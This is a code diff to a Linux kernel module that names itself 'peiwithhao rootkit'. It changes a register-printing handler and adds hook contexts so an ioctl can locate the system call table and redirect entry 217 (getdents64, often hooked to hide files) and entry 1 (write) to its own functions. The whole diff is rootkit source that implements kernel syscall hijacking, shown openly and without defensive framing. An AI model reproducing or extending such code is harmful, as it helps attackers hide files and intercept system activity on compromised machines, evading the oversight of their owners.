@@ -9,13 +9,12 @@
 
 static void funny_joke(struct pt_regs * regs){
     printk(KERN_INFO "[peiwithhao rootkit] \n\n");
-    printk(KERN_INFO "rdi = %p", (void *)regs->di);
-    printk(KERN_INFO "rsi = %p", (void *)regs->si);
-    printk(KERN_INFO "rdx = %p", (void *)regs->dx);
-    printk(KERN_INFO "rcx = %p", (void *)regs->cx);
-    printk(KERN_INFO "r8 = %p", (void *)regs->r8);
-    printk(KERN_INFO "r9 = %p", (void *)regs->r9);
-    printk(KERN_INFO "[peiwithhao rootkit] \n");
+    printk(KERN_INFO "rdi = %lx", regs->di);
+    printk(KERN_INFO "rsi = %lx", regs->si);
+    printk(KERN_INFO "rdx = %lx", regs->dx);
+    printk(KERN_INFO "rcx = %lx", regs->cx);
+    printk(KERN_INFO "r8 = %lx", regs->r8);
+    printk(KERN_INFO "r9 = %lx", regs->r9);
 }
 
 
@@ -32,6 +31,8 @@ ssize_t pwh_rootkit_write(struct file *file, const char __user *buf, size_t coun
     return 0;
 }
 
+struct hook_context getdents_hook_ctx;
+struct hook_context read_hook_ctx;
 long pwh_rootkit_ioctl(struct file *file, unsigned int cmd, unsigned long arg){
     size_t hooked_addr;
     int ret; switch(cmd){
@@ -45,9 +46,10 @@ long pwh_rootkit_ioctl(struct file *file, unsigned int cmd, unsigned long arg){
         case SUPER_HOOK:
                 /* 寻找系统调用表 */
             sys_call_table_finder();
-            hooked_addr = ((size_t *)syscall_table_addr)[1];
+            hooked_addr = ((size_t *)syscall_table_addr)[217];
             //orig_modifier(hooked_addr, (size_t)&funny_joke);
-            orig_modifier((size_t)hooked_addr, (size_t)&funny_joke, (size_t)poor_joke);
+            orig_modifier(&getdents_hook_ctx, (size_t)hooked_addr, 0, (size_t)poor_joke);
+            orig_modifier(&read_hook_ctx, (size_t)((size_t *)syscall_table_addr)[1], (size_t)&funny_joke, 0);
             break;
         default:
             break;
